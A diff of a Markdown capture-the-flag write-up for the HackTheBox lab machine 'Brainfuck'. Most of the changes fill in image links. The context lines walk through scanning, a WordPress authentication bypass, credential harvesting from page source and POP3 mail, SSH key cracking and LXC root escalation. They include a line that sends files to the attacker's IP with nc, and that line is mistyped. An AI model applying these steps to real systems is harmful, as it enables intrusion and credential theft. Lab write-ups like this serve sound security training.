@@ -1,5 +1,5 @@
 # Brainfuck [HTB](https://app.hackthebox.com/machines/17)
-![brainfuck-01]()
+![brainfuck-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/brainfuck-01.png)
 
 
 ## Recon
@@ -10,7 +10,7 @@ After adding the target to my `/etc/hosts` file I start scanning for open ports:
 nmap -p- --min-rate 10000 brainfuck.htb
 ```
 
-![ports-02]()
+![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/ports-02.png)
 
 
 Let's run a version detection scan againts the found ports:
@@ -19,8 +19,8 @@ Let's run a version detection scan againts the found ports:
 nmap -p 22,25,110,143,443 -sCV brainfuck.htb -oN nmap.results
 ```
 
-![nmap-res-03]()
-![nmap-res-04]()
+![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/nmap-res-03.png)
+![nmap-res-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/nmap-res-04.png)
 
 We have the following:
 
@@ -66,7 +66,7 @@ python3 -m http.server 80
 
 Then, I connect to the SMTP server and send an email as such:
 
-![email-05]()
+![email-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/mail-05.png)
 
 
 The `orestis@brainfuck.htb` address I got from the Nginx server which I will show later, but in general this is how you would exploit this. 
@@ -92,7 +92,7 @@ Let's check it out!
 
 When I was trying to pull off the previous RCE exploit, I needed a valid recipent address to send the email to. So I decided look for clues in the Nginx server. If we browse towards `https://brainfuck.htb/` we see the following:
 
-![site-06]()
+![site-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/site-06.png)
 
 
 This is where I got the email address of `orestis@brainfuck.htb`. It also looks like this user is an admin on this WordPress site. My `Weppalayzer` also idnetifies this to be a WordPress site. 
@@ -100,12 +100,12 @@ This is where I got the email address of `orestis@brainfuck.htb`. It also looks 
 
 On the main page there are a few links, There is the `Open Ticket` and `Sample Page` links at the upper strip, and down at the buttom there is a `Log In` link:
 
-![login-07]()
+![login-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/login-07.png)
 
 
 As you can see in the above screenshot, there are two more links in this window, `Entries RSS` and `Comments RSS`, both lead to the same file which reads as such:
 
-![rss-file-08]()
+![rss-file-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/rss-file-08.png)
 
 
 This looks like a generic informational file from WordPress, but the juciy piece of information here is the WordPRess version which is `4.7.3`. If we search online, we can find a [password reset vulnerability](https://www.exploit-db.com/exploits/41963) for this version.
@@ -122,17 +122,17 @@ curl -k -X POST https://brainfuck.htb/wp-login.php?action=lostpassword -H 'Host:
 
 This resulted in a 404 response form the server:
 
-![err-09]()
+![err-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/err-09.png)
 
 
 So instead, I tried to use the actual form, and send a legitimate request for a password reset, without modifying any headers:
 
-![request-10]()
+![request-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/request-10.png)
 
 
 We can see that the server got an internal server error, the reason? 
 
-![reason-11]()
+![reason-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/reason-11.png)
 
 
 The `email()` function has been disabled on the target server. And based on the previous error, we know that we need to pass a valid domain name to the `Host` header as our email server, an IP address will not suffice. So how will this box resolve our malicious domain name? This is not the way forward. 
@@ -144,7 +144,7 @@ At this point I decided to shift gears and use `wpscan` as such:
 wpscan --disable-tls-checks --url https://brainfuck.htb/
 ```
 
-![wpscan-12]()
+![wpscan-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/wpscan-12.png)
 
 
 Out of all of the scan result I found the above plugin to be the most interesting. If we lookup for vulnerabilities for this plugin, we can find an [authnitcation bypass vulnerability](https://www.exploit-db.com/exploits/41006) on ExploitDB for this exact version.
@@ -164,7 +164,7 @@ According to the vulnerability, the `/wp-admin/admin-ajax.php` script doesn't pr
 
 If we run `curl -k https://brainfuck.htb/wp-admin/admin-ajax.php` we can see the following:
 
-![curl-13]()
+![curl-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/curl-13.png)
 
 
 This proves that the `/wp-admin/admin-ajax.php` file exsits on the target. Though Im not sure what's the meaning of this zero. 
@@ -172,7 +172,7 @@ This proves that the `/wp-admin/admin-ajax.php` file exsits on the target. Thoug
 
 If we follow along the exploit notes, to pull this exploit off we need to send a request like this:
 
-![request-14]()
+![request-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/request-14.png)
 
 
 Note that I've changed the useername from `administrator` to `admin`, as this was the noted user account in the site's main page. And as you can see in the response, we got a cookie of `wordpress_logged_in` for the admin user! 
@@ -180,7 +180,7 @@ Note that I've changed the useername from `administrator` to `admin`, as this wa
 
 So if we browse towards `https://brainfuck.htb/wp-admin/` we should get access to the admin panel:
 
-![wp-admin-15]()
+![wp-admin-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/wp-admin-15.png)
 
 
 We are in! 
@@ -197,7 +197,7 @@ So instead, I tried to uplaod a malicious plugin that I created, which had a rev
 
 At this point I wasn't sure what to do, so I started clicking around the admin panel, looking into every page. In the `Settings` tab I found the `Easy WP SMTP` section which had the following:
 
-![wp-easy-smtp-16]()
+![wp-easy-smtp-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/wp-easy-smtp-16.png)
 
 
 This looked interesting, from my research online I found that the `Easy WP SMTP` plugin in a way to integrate WordPress with your email server. Allowing you to receive informational emails and upload stuff to your site via email, pretty cool. 
@@ -205,7 +205,7 @@ This looked interesting, from my research online I found that the `Easy WP SMTP`
 
 This settings page seems to be storing the credentials to the email server. The password is hidden, but if we right click on it, and select `inspect` we will get the HTML tag in the source code which holds the value of this password in clear text:
 
-![clear-text-17]()
+![clear-text-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/clear-text-17.png)
 
 
 The settings page of `Easy WP SMTP` also has the details of the email server to connect to. Here we see port 25 of the localhost on the target.
@@ -213,12 +213,12 @@ The settings page of `Easy WP SMTP` also has the details of the email server to 
 
 But if we use `telnet` to conenct to the SMTP server on the target and try to login, we will see that authintication has been disabled:
 
-![smtp-no-auth-18]()
+![smtp-no-auth-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/smtp-no-auth-18.png)
 
 
 Ok... Instead I tried to login to the POP3 server using the found credentials:
 
-![pop3-auth-19]()
+![pop3-auth-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/pop3-auth-19.png)
 
 
 It worked! 
@@ -226,7 +226,7 @@ It worked!
 
 From here we can list the numbers of emails in the `orestis`'s queue and list them:
 
-![stat-20]()
+![stat-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/stat-20.png)
 
 
 The `orestis` user has three emails. We can read each email by running `RETR <num>`, where <num> is the email number. Here is the breakdown of the emails:
@@ -237,17 +237,17 @@ The first email is an automated email from WordPress after successfully setting 
 
 The third email is from the initial RCE exploit we tried to pull of in the beginning:
 
-![third-21]()
+![third-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/third-21.png)
 
 
 But the second email is from root, and it's the most useful. Here we see credentials for a `secret` forum:
 
-![secret-creds-22]()
+![secret-creds-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/secret-creds-22.png)
 
 
 We know we had a sub-domain of `sup3rs3cr3t.brainfuck.htb` from the initial nmap scan, they are probably referring to that. But I also tried to connect to the SSH with these credentials and I recived the following error:
 
-![ssh-err-23]()
+![ssh-err-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/ssh-err-23.png)
 
 
 This means that the target server is only interested in key based authintication, and since we dont have a public key which is acceptable by the server, we get this error message. 
@@ -261,12 +261,12 @@ Let's check this secret forum!
 
 If we browse towards `https://sup3rs3cr3t.brainfuck.htb/` we see the following:
 
-![forum-24]()
+![forum-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/forum-24.png)
 
 
 At the top right there is a login button. After logging in using the credentials we found from `orestis`'s email, we see the following: 
 
-![inside-25]()
+![inside-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/inside-25.png)
 
 
 These look like chat channels. 
@@ -274,7 +274,7 @@ These look like chat channels.
 
 If we go to the `SSH Access` channel, we see the following exchange:
 
-![channel-26]()
+![channel-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/channel-26.png)
 
 
 The message order here is from top to buttom, meaining that the messages at the top are the oldest, and the buttom most messages are the recent ones. 
@@ -288,7 +288,7 @@ This `admin` user confirms that password based authentication to the SSH server 
 
 `orestis` is referring the `Key` channel, and if we take a look at it we see the following:
 
-![key-channel-27]()
+![key-channel-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/key-channel-27.png)
 
 
 One of the messages definitely stands out, as it looks like a url. Intersting. 
@@ -308,7 +308,7 @@ Another point where this is visible is with our `orestis`'s signiture, we know f
 
 I decided to identify this cipher text, I tried different websites, until [this](https://www.cryptool.org/en/cto/ncid) site gave me the correct lead:
 
-![lead-28]()
+![lead-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/lead-28.png)
 
 
 This site suggested that the cipher text I gave it (extracted from the admin's URL message), is actually a [Running Key](https://en.wikipedia.org/wiki/Running_key_cipher) cipher text. 
@@ -316,7 +316,7 @@ This site suggested that the cipher text I gave it (extracted from the admin's U
 
 In short, `Running-Key` is a form of symetric encryption which uses a random string, liek sentences from books as the encryption key. The actual subsitutuion of the characters is achived using the following tableau:
 
-![tableau-29]()
+![tableau-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/tableau-29.png)
 
 
 There is another very important aspect to the running-key encrpyion, which is that the encryption key could also be derived from parts of the clear-text message to be encrypted! [source](https://sites.google.com/site/cryptocrackprogram/user-guide/cipher-types/substitution/running-key). 
@@ -342,7 +342,7 @@ At this point I found the [following website](https://www.cachesleuth.com/runnin
 
 At first, I started by inputting parts the cipher text, and guessing possible keys based on the equivalent clear-text parts of said cipher text. So for example, we know that `zsrivszwm` in cipher text is `brainfuck` in clear text, so I inputted both:
 
-![initail-30]()
+![initail-30](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/initial-30.png)
 
 
 The result is the string `ybrainfuc` at the top.. OK something definitely happened.
@@ -350,7 +350,7 @@ The result is the string `ybrainfuc` at the top.. OK something definitely happen
 
 Then I added the suffix of the domain which is `htb` in clear text, and `rfz` in cipher:
 
-![step-two-31]()
+![step-two-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/step-two-31.png)
 
 
 I think I'm on the right track, the result from the decrpyion is starting to form a sentence.
@@ -358,7 +358,7 @@ I think I'm on the right track, the result from the decrpyion is starting to for
 
 Next, I added the protocol section of the URL, which is `https` in clear text and `mnvze` is cipher:
 
-![key-32]()
+![key-32](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/key-32.png)
 
 
 It looks like the sentence is starting to repeat itself, could the encryption key be `fuckmybrain`? 
@@ -366,7 +366,7 @@ It looks like the sentence is starting to repeat itself, could the encryption ke
 
 Let's try to decrypt the cipher URL with this key:
 
-![url-33]()
+![url-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/url-33.png)
 
 
 Looks like a valid URL! 
@@ -380,7 +380,7 @@ Running-key only encrypts characters, not numbers, so it makes since why this de
 
 I used [this site](https://www.dcode.fr/vigenere-cipher) to properly decrypt the cipher text using said key:
 
-![true-link-34]()
+![true-link-34](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/true-link-34.png)
 
 
 If we curl for this link we get the `orestis` SSH key:
@@ -389,7 +389,7 @@ If we curl for this link we get the `orestis` SSH key:
 curl -k https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
 ```
 
-![ssh-key-35]()
+![ssh-key-35](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/ssh-key-35.png)
 
 
 We got the SSH key, but it seems to be encrypted, let's try to brute force the password. 
@@ -409,7 +409,7 @@ ssh2john orestis_id_rsa > orestis_id_rsa.hash
 john orestis_id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-![cracked-36]()
+![cracked-36](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/cracked-36.png)
 
 
 Here it is, the password for the SSH key is `3poulakia!`. 
@@ -421,7 +421,7 @@ Let's try to login to the SSH:
 ssh -i orestis_id_rsa orestis@brainfuck.htb
 ```
 
-![ssh-37]()
+![ssh-37](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/ssh-37.png)
 
 
 ## Privilege Escalation
@@ -431,12 +431,12 @@ If we take a look at the above screenshot, we will notice that `orestis` is a pa
 
 Before pulling this off, I wanted to have a look at `orestis`'s home folder, that's where I saw the following:
 
-![orestis-home-38]()
+![orestis-home-38](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/orestis-home-38.png)
 
 
 This file caught my eye, so I decided to have a look at it:
 
-![sage-39]()
+![sage-39](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/sage-39.png)
 
 
 This is clearly a python script based on the syntax, but there is some functions and methods here that I dont recognize, and I dont see any module imports so i'm not sure how its' working exactly. But the more important question is what is it doing? 
@@ -578,7 +578,7 @@ cat debug.txt > nc 10.10.14.54 23
 
 I repeat the process for both files, and now I have them both on my attack machine:
 
-![files-40]()
+![files-40](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/files-40.png)
 
 
 Now it's time to build a script. 
@@ -610,7 +610,6 @@ with open('debug.txt', 'rt') as file:
     e = int(lines[2])
     n = p*q
 
-
 with open('output.txt', 'rt') as file:
     t = file.read().strip().split(' ')
     c = int(t[-1])
@@ -632,7 +631,7 @@ print(password)
 
 If we run it we get the following:
 
-![flag-41]()
+![flag-41](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/flag-41.png)
 
 
 This is in fact the root flag, and it was accepted by HTB to give me the conformation that I've solved the box. But I will prove that this is the root flag later on once we get the root shell.
@@ -674,7 +673,7 @@ lxc-create HTB -t busybox
 lxc-ls -f	# list containers
 ```
 
-![lxc-ls-42]()
+![lxc-ls-42](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/lxc-ls-42.png)
 
 
 The actual container is at `/var/lib/lxc/HTB/rootfs`, and we need to make a copy of this filesystem using:
@@ -687,7 +686,7 @@ tar xfj ../busyboxOrig.tar.bz2
 ls
 ``` 
 
-![ls-43]()
+![ls-43](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/ls-43.png)
 
 
 The next step is to make a minimal yaml metadata file for `lxc`:
@@ -698,7 +697,7 @@ echo creation_date: 1424284563 >> metadata.yaml
 cat metadata.yaml
 ```
 
-![yaml-44]()
+![yaml-44](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/yaml-44.png)
 
 
 Now we have a temporary working image, but we want to shrink it as much as possible! 
@@ -715,7 +714,7 @@ rm init
 ln -s ../../bin/busybox init
 ```
 
-![rm-init-45]()
+![rm-init-45](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/rm-init-45.png)
 
 
 The next step will be to remove all the junk from the container that we don't need:
@@ -727,7 +726,7 @@ rm -r usr bin lib lib64
 for a in usr bin lib lib64; do ln -s ./r/$a; done  
 ```
 
-![rootfs-46]()
+![rootfs-46](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/rootfs-46.png)
 
 
 Now we can create the final container image using:
@@ -739,7 +738,7 @@ cd ..
 ls -l htbFinal.tar.bz2 
 ```
 
-![final-47]()
+![final-47](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/final-47.png)
 
 
 My container image endded up being about 1050 byts instead of 656, maybe busybox changed their contianer image from when `M0NOC` wrote the action plan? Anyway I'll take it! 
@@ -751,7 +750,7 @@ Now it's time to transfer the archive over to the target. To do that we can base
 base64 -w 0 htbFinal.tar.bz2 ; echo
 ```
 
-![encode-48]()
+![encode-48](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/encode-48.png)
 
 
 Then we can copy the entire base64 string and decode it on the target system using:
@@ -760,12 +759,12 @@ Then we can copy the entire base64 string and decode it on the target system usi
 echo <base64> | base64 -d > orestis.tar.bz2
 ```
 
-![decode-49]()
+![decode-49](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/decode-49.png)
 
 
 Here is our archive on the target:
 
-![on-target-50]()
+![on-target-50](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/on-target-50.png)
 
 
 Now we are ready to pull of the exploit! 
@@ -778,7 +777,7 @@ lxc start orestisVM
 lxc exec orestisVM -- /bin/sh
 ```
 
-![root-51]()
+![root-51](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/root-51.png)
 
 
 It worked!!! 
@@ -786,9 +785,9 @@ It worked!!!
 
 By the way, here is the proof that the root flag matches what we solved earlier:
 
-![matches-51.5]()
+![matches-51.5](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/matches-51.5.png)
 
 
 From here we can acess the host filesystem at `r/` :
 
-!fs-52]()
+!fs-52](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Brainfuck/img/fs-52.png)
